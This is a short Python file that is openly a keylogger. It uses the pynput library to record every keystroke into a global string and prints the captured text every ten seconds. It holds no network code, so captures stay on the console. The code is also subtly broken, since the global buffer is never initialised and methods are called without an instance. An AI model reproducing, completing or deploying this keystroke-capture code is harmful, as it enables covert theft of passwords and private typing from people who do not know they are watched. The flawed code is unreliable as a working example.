import pynput.keyboard
import threading

class Keylogger:
    def process_keys(self,key):
        global keys
        try:
            keys = keys + str(key.char)
        except AttributeError:
            if key == key.space:
                keys = keys + " "
            elif key == key.enter:
                keys = keys + "\n"
            elif key == key.right:
                keys = keys + ""
            elif key == key.left:
                keys = keys + ""
            elif key == key.up:
                keys = keys + ""
            elif key == key.down:
                keys = keys + ""
            else:
                keys = keys + " " + str(key) + " "

    def report(self):
        global keys
        print(keys)
        keys = ""
        timer = threading.Timer(10,Keylogger.report)
        timer.start()

    def main(self):
        listener = pynput.keyboard.Listener(on_press=Keylogger.process_keys)
        with listener:
            Keylogger.report()
            listener.join()